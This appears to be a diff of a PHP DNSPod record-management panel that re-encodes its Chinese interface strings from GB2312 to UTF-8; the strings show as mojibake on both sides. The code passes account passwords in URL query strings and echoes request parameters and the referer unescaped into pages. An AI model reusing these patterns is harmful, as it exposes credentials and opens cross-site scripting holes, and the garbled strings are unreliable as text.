         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÓòÃû<?php  if (trim(request("status")) == "enable"){ ?>Æô¶¯<?php  }else{ ?>Í£Ö¹<?php }?>³É¹¦£¡<?php echo ($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                åŸŸå<?php  if (trim(request("status")) == "enable"){ ?>å¯åŠ¨<?php  }else{ ?>åœæ­¢<?php }?>æˆåŠŸï¼<?php echo ($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -10461,11 +12089,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ÓòÃû<?php  if (trim(request("status")) == "enable"){ ?>Æô¶¯<?php  }else{ ?>Í£Ö¹<?php }?>Ê§°Ü£¡, Ô­Òò: <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?><?php echo " <br>".$timeout/1000?> Ãëºó·µ»ØÉÏÒ»Ò³
+                åŸŸå<?php  if (trim(request("status")) == "enable"){ ?>å¯åŠ¨<?php  }else{ ?>åœæ­¢<?php }?>å¤±è´¥ï¼, åŸå› : <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?><?php echo " <br>".$timeout/1000?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 <?php 
@@ -10500,7 +12128,7 @@ function changeimg()
                                         '<item>'.
                                         '<id>5246120</id>'.
                                         '<name>@</name>'.
-                                        '<line><![CDATA[Ä¬ÈÏ]]></line>'.
+                                        '<line><![CDATA[é»˜è®¤]]></line>'.
                                         '<type>A</type>'.
                                         '<ttl>600</ttl>'.
                                         '<value>1.1.1.1</value>'.
@@ -10566,7 +12194,7 @@ function changeimg()
                 $objXml = new DOMDocument();  
                 $objXml->preserveWhiteSpace = true;
                 $objXml->async = false; 
-                // ¼ÓXml ÎÄ¼ş    
+                // åŠ Xml æ–‡ä»¶    
                 $objXml->loadXML($xmlstr);
                 $objList = $objXml->getElementsByTagName("item");               
                 //echo $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;
@@ -10586,13 +12214,13 @@ function selitemall()
 }
 function delitem()
 {
- if(!confirm('È·¶¨É¾³ıÑ¡ÖĞµÄ×ÓÓòÃûÂğ?')) return;
+ if(!confirm('ç¡®å®šåˆ é™¤é€‰ä¸­çš„å­åŸŸåå—?')) return;
  document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Record.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>&delok=1';
  document.dnspod.submit();
 }
 function doitem(act)
 {
- if(!confirm('È·¶¨¸ü¸ÄÑ¡ÖĞµÄ×ÓÓòÃû×´Ì¬Âğ?')) return;
+ if(!confirm('ç¡®å®šæ›´æ”¹é€‰ä¸­çš„å­åŸŸåçŠ¶æ€å—?')) return;
  document.dnspod.action='<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>&status=' + act;
  document.dnspod.submit();
 }
@@ -10602,12 +12230,12 @@ function doitem(act)
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3"> ²é Ñ¯ ½á ¹û : ¹² <?php echo $totalitem;?> Ìõ </td>
+                <td align="center" colspan="3"> æŸ¥ è¯¢ ç»“ æœ : å…± <?php echo $totalitem;?> æ¡ </td>
         </tr>
 </table>
 <table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>ÓÃ»§</a> - <?php echo $dnspoduname;?> ] >> <?php  echo trim(request("topdomain"))?>  </td>
+                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>ç”¨æˆ·</a> - <?php echo $dnspoduname;?> ] >> <?php  echo trim(request("topdomain"))?>  </td>
         </tr>
 </table>        
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
@@ -10625,13 +12253,13 @@ function doitem(act)
                         <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                 </td>   
                 <td align="center" width=17%>
-                        ¼ÇÂ¼Öµ
+                        è®°å½•å€¼
                 </td>
                 <td align="center" width=10%>
-                        ÏßÂ·
+                        çº¿è·¯
                 </td>
                 <td align="center" width=10%>
-                        ÀàĞÍ
+                        ç±»å‹
                 </td>
                 <td align="center" width=5%>
                         MX
@@ -10640,10 +12268,10 @@ function doitem(act)
                         TTL
                 </td>
                 <td align="center" width=23%>
-                        ¼ÇÂ¼Öµ
+                        è®°å½•å€¼
                 </td>
                 <td align="center" width=30%>
-                        <a style="color:#444444" href="<?php  echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Record.Create");?>&skin=<?php echo $skincolor?>&uname=<?php echo encodeuri(trim(request("uname")))?>&pwd=<?php echo encodeuri(trim(request("pwd")))?>&domainid=<?php echo trim(request("domainid"))?>&topdomain=<?php echo encodeuri(trim(request("topdomain")))?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page."&grade=".encodeuri(trim(request("grade")))?>">Ìí¼Ó</a> ËÑË÷ <a style="color:#444444" href="javascript:delitem();">É¾³ı</a> <a style="color:#444444" href="javascript:doitem('enable');">Æô</a>/<a style="color:#444444" href="javascript:doitem('disable');">Í£</a>
+                        <a style="color:#444444" href="<?php  echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Record.Create");?>&skin=<?php echo $skincolor?>&uname=<?php echo encodeuri(trim(request("uname")))?>&pwd=<?php echo encodeuri(trim(request("pwd")))?>&domainid=<?php echo trim(request("domainid"))?>&topdomain=<?php echo encodeuri(trim(request("topdomain")))?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page."&grade=".encodeuri(trim(request("grade")))?>">æ·»åŠ </a> æœç´¢ <a style="color:#444444" href="javascript:delitem();">åˆ é™¤</a> <a style="color:#444444" href="javascript:doitem('enable');">å¯</a>/<a style="color:#444444" href="javascript:doitem('disable');">åœ</a>
                 </td> 
         </tr>   
                 <?php 
@@ -10659,7 +12287,7 @@ function doitem(act)
                         $recordid = $objHdd->getElementsByTagName('id')->item(0)->nodeValue;
                         $recordname = $objHdd->getElementsByTagName('name')->item(0)->nodeValue;
                         $recordtype = $objHdd->getElementsByTagName('type')->item(0)->nodeValue;
-                        $recordline = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('line')->item(0)->nodeValue);
+                        $recordline = ($objHdd->getElementsByTagName('line')->item(0)->nodeValue);
                         $recordttl = $objHdd->getElementsByTagName('ttl')->item(0)->nodeValue;
                         $recordvalue = $objHdd->getElementsByTagName('value')->item(0)->nodeValue;
                         $recordmx = $objHdd->getElementsByTagName('mx')->item(0)->nodeValue;
@@ -10689,7 +12317,7 @@ function doitem(act)
                 <td align="center">
                         <?php echo $recordvalue?>
                 </td>
-                <td align="center"><a href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Modify")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".encodeuri(trim(request("domainid")))."&record_id=".$recordid."&sub_domain=".encodeuri($recordname)."&record_type=".$recordtype."&record_line=".$recordline."&value=".encodeuri($recordvalue)."&mx=".$recordmx."&ttl=".$recordttl."&edit=1&topdomain=".encodeuri(trim(request("topdomain")))."&grade=".encodeuri(trim(request("grade")));?>" style="color:#444444">ĞŞ¸Ä</a> <a style="color:#444444" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>">É¾³ı</a> <?php  if ($recordenabled == "1"){?><a style="color:#444444" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&status=disable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>">Í£ÓÃ</a><?php }else{?><a style="color:#444444" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&status=enable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">ÆôÓÃ</a><?php }?> ¼à¿Ø</td>
+                <td align="center"><a href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Modify")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".encodeuri(trim(request("domainid")))."&record_id=".$recordid."&sub_domain=".encodeuri($recordname)."&record_type=".$recordtype."&record_line=".$recordline."&value=".encodeuri($recordvalue)."&mx=".$recordmx."&ttl=".$recordttl."&edit=1&topdomain=".encodeuri(trim(request("topdomain")))."&grade=".encodeuri(trim(request("grade")));?>" style="color:#444444">ä¿®æ”¹</a> <a style="color:#444444" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>">åˆ é™¤</a> <?php  if ($recordenabled == "1"){?><a style="color:#444444" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&status=disable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>">åœç”¨</a><?php }else{?><a style="color:#444444" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&status=enable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">å¯ç”¨</a><?php }?> ç›‘æ§</td>
         </tr>   
                 <?php 
                 }
@@ -10699,13 +12327,13 @@ function doitem(act)
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdbg">
-                <td align="center" colspan="3"> ¹² <?php  echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3"> å…± <?php  echo $totalpage;?> é¡µ ç¬¬  
                 <?php 
-                echo $page." Ò³ ".$sCrLf;
+                echo $page." é¡µ ".$sCrLf;
                 if (floor($page)>1)
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>ÉÏÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>ä¸Šä¸€é¡µ</a> ";
                 if (floor($page)>0 && floor($page)<floor($totalpage))
-                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>ÏÂÒ»Ò³</a> ";
+                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>ä¸‹ä¸€é¡µ</a> ";
                 				
                 				?>
                 				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->input("#FCFC9D",""); ?>>
@@ -10719,14 +12347,14 @@ function doitem(act)
         </tr>   
 </table>
 <?php 
-                //$gotopage->gotopage($totalpage,ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."&gopage=ok&page=","ÇëÊäÈëÒª×ªµ½µÄÒ³Êı","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                //$gotopage->gotopage($totalpage,ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."&gopage=ok&page=","è¯·è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 break;   // action - Record.List end    
         case "Record.Create": // action - Record.Create start
                 if (trim(request("record_type")) == "" || trim(request("record_line")) == "" || trim(request("value")) == ""){
 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>ÓÃ»§</a> - <?php echo $dnspoduname;?> ] >> <?php  echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri("Record.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>".trim(request("topdomain"))."</a>";?>  </td>
+                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>ç”¨æˆ·</a> - <?php echo $dnspoduname;?> ] >> <?php  echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri("Record.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>".trim(request("topdomain"))."</a>";?>  </td>
         </tr>
 </table>
 <script>
@@ -10739,7 +12367,7 @@ function changeimg()
         <tr class="tdtbg" height="50">
                 <td align="center">
                         <form action="<?php echo ScriptPath()?>?api=dnspod&domainid=<?php echo trim(request("domainid"))?>&action=<?php echo encodeuri("Record.Create");?>&pagesize=<?php echo encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&topdomain=".encodeuri(trim(request("topdomain")))."&skin=".$skincolor?>" method="post" name="dnspod">
-                        &nbsp¼ÇÂ¼Ãû£º<input type="text" class="text" name="sub_domain" value="" style="height:20px;width:15%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspè®°å½•åï¼š<input type="text" class="text" name="sub_domain" value="" style="height:20px;width:15%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
                         <SELECT name="record_type" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:10%;height:16px;font-size:12px">
                         <?php 
                         if (0){
@@ -10799,10 +12427,10 @@ function changeimg()
                         $record_type = "";
                         for($i=0;$i<$objList->length;$i++){
                                 if ($i=='0'){
-                                        $record_type = $record_type.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
+                                        $record_type = $record_type.($objList->item($i)->nodeValue);
                                 }
                                 else{
-                                        $record_type = $record_type.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
+                                        $record_type = $record_type.",".($objList->item($i)->nodeValue);
                                 }
                         }
                         //echo $record_type;
@@ -10828,13 +12456,13 @@ function changeimg()
                                                 '<created_at>2010-10-07 14:56:40</created_at>'.
                                                 '</status>'.
                                                 '<lines>'.
-                                                '<item><![CDATA[Ä¬ÈÏ]]></item>'.
-                                                '<item><![CDATA[µçĞÅ]]></item>'.
-                                                '<item><![CDATA[ÍøÍ¨]]></item>'.
-                                                '<item><![CDATA[½ÌÓıÍø]]></item>'.
-                                                '<item><![CDATA[ÒÆ¶¯]]></item>'.
-                                                '<item><![CDATA[ÌúÍ¨]]></item>'.
-                                                '<item><![CDATA[¹úÍâ]]></item>'.
+                                                '<item><![CDATA[é»˜è®¤]]></item>'.
+                                                '<item><![CDATA[ç”µä¿¡]]></item>'.
+                                                '<item><![CDATA[ç½‘é€š]]></item>'.
+                                                '<item><![CDATA[æ•™è‚²ç½‘]]></item>'.
+                                                '<item><![CDATA[ç§»åŠ¨]]></item>'.
+                                                '<item><![CDATA[é“é€š]]></item>'.
+                                                '<item><![CDATA[å›½å¤–]]></item>'.
                                                 '</lines>'.
                                                 '</dnspod>';
                         }       
@@ -10874,13 +12502,13 @@ function changeimg()
                         $record_type = "";
                         for($i=0;$i<$objList->length;$i++){
                                 if ($i=='0'){
-                                        $record_line = $record_line.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
+                                        $record_line = $record_line.($objList->item($i)->nodeValue);
                                 }
                                 else{
-                                        $record_line = $record_line.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
+                                        $record_line = $record_line.",".($objList->item($i)->nodeValue);
                                 }
                         }
-                        //$record_line = "Ä¬ÈÏ,µçĞÅ,ÍøÍ¨,½ÌÓıÍø,ÒÆ¶¯,ÌúÍ¨,¹úÍâ";
+                        //$record_line = "é»˜è®¤,ç”µä¿¡,ç½‘é€š,æ•™è‚²ç½‘,ç§»åŠ¨,é“é€š,å›½å¤–";
                         for ($record_linei = 0; $record_linei < count(split("[,]",$record_line));$record_linei++){
                         ?>
                                 <OPTION VALUE="<?php echo arrmember(split(",",$record_line),($record_linei))?>" <?php if (trim(request("record_line"))==arrmember(split("[,]",$record_line),($record_linei))) {?>selected<?php }?>><?php echo arrmember(split("[,]",$record_line),($record_linei))?></OPTION>
@@ -10888,10 +12516,10 @@ function changeimg()
                         }
                         ?>
                         </SELECT>
-                        &nbsp¼ÇÂ¼Öµ£º<input type="text" class="text" name="value" value="" style="height:20px;width:15%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspMXÓÅÏÈ¼¶£º<input type="text" class="text" name="mx" value="" style="height:20px;width:5%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspTTL£º<input type="text" class="text" name="ttl" value="" style="height:20px;width:5%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
-                        &nbspÑéÖ¤Âë£º<input maxlength="4" <?php  $style->input("#FCFC9D","") ?> name="checkcode" id="checkcode" maxlength="4" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
+                        &nbspè®°å½•å€¼ï¼š<input type="text" class="text" name="value" value="" style="height:20px;width:15%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspMXä¼˜å…ˆçº§ï¼š<input type="text" class="text" name="mx" value="" style="height:20px;width:5%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspTTLï¼š<input type="text" class="text" name="ttl" value="" style="height:20px;width:5%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspéªŒè¯ç ï¼š<input maxlength="4" <?php  $style->input("#FCFC9D","") ?> name="checkcode" id="checkcode" maxlength="4" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                         <input type="hidden" class="text" name="skin" value="<?php echo $skincolor?>"> 
                         <input type="hidden" class="text" name="refer" value="<?php echo trim($_SERVER['HTTP_REFERER'])?>"> 
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
@@ -10904,7 +12532,7 @@ function changeimg()
                         if (preg_match("/(?:([\w]*[.])*[\w]*)/i", trim(request("sub_domain")))) {
                         }
                         else{   
-                                AlertBack ("¼ÇÂ¼»ò¼ÇÂ¼Öµ¸ñÊ½´íÎó£¡" , 2);
+                                AlertBack ("è®°å½•æˆ–è®°å½•å€¼æ ¼å¼é”™è¯¯ï¼" , 2);
                         }       
                 }
                 if (trim(request("record_type")) != "A" && trim(request("record_type")) != "URL")
@@ -11001,11 +12629,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ×ÓÓòÃûÌí¼Ó³É¹¦£¡×ÓÓòÃûID£º<?php echo $objXml->getElementsByTagName("id")->item(0)->nodeValue?> Êµ¼Ê×ÓÓòÃû¼ÇÂ¼£º<?php echo $objXml->getElementsByTagName("name")->item(0)->nodeValue." <br>".($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                å­åŸŸåæ·»åŠ æˆåŠŸï¼å­åŸŸåIDï¼š<?php echo $objXml->getElementsByTagName("id")->item(0)->nodeValue?> å®é™…å­åŸŸåè®°å½•ï¼š<?php echo $objXml->getElementsByTagName("name")->item(0)->nodeValue." <br>".($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
         <?php 
@@ -11019,11 +12647,11 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ×ÓÓòÃûÌí¼ÓÊ§°Ü£¡Ô­Òò<?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?> <?php echo " <br>".($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                å­åŸŸåæ·»åŠ å¤±è´¥ï¼åŸå› <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?> <?php echo " <br>".($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
         <?php 
@@ -11040,7 +12668,7 @@ function changeimg()
 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>ÓÃ»§</a> - <?php echo $dnspoduname;?> ] >> <?php  echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri("Record.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainid=".trim(request("domain_id"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>".trim(request("topdomain"))."</a>";?>  </td>
+                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>ç”¨æˆ·</a> - <?php echo $dnspoduname;?> ] >> <?php  echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri("Record.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainid=".trim(request("domain_id"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>".trim(request("topdomain"))."</a>";?>  </td>
         </tr>
 </table>
 <script>
@@ -11053,7 +12681,7 @@ function changeimg()
         <tr class="tdtbg" height="50">
                 <td align="center">
                         <form action="<?php echo ScriptPath()?>?api=dnspod&domain_id=<?php echo trim(request("domain_id"))?>&record_id=<?php echo trim(request("record_id"))?>&action=<?php echo encodeuri("Record.Modify")?>&pagesize=<?php echo encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor?>" method="post" name="dnspod">
-                        &nbsp¼ÇÂ¼Ãû£º<input type="text" class="text" name="sub_domain" value="<?php echo trim(request("sub_domain"))?>" style="height:20px;width:15%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
+                        &nbspè®°å½•åï¼š<input type="text" class="text" name="sub_domain" value="<?php echo trim(request("sub_domain"))?>" style="height:20px;width:15%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
                         <SELECT name="record_type" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:10%;height:16px;font-size:12px">
                         <?php 
                         if (0){
@@ -11113,10 +12741,10 @@ function changeimg()
                         $record_type = "";
                         for($i=0;$i<$objList->length;$i++){
                                 if ($i=='0'){
-                                        $record_type = $record_type.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
+                                        $record_type = $record_type.($objList->item($i)->nodeValue);
                                 }
                                 else{
-                                        $record_type = $record_type.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
+                                        $record_type = $record_type.",".($objList->item($i)->nodeValue);
                                 }
                         }
                         //echo $record_type;
@@ -11143,13 +12771,13 @@ function changeimg()
                                                 '<created_at>2010-10-07 14:56:40</created_at>'.
                                                 '</status>'.
                                                 '<lines>'.
-                                                '<item><![CDATA[Ä¬ÈÏ]]></item>'.
-                                                '<item><![CDATA[µçĞÅ]]></item>'.
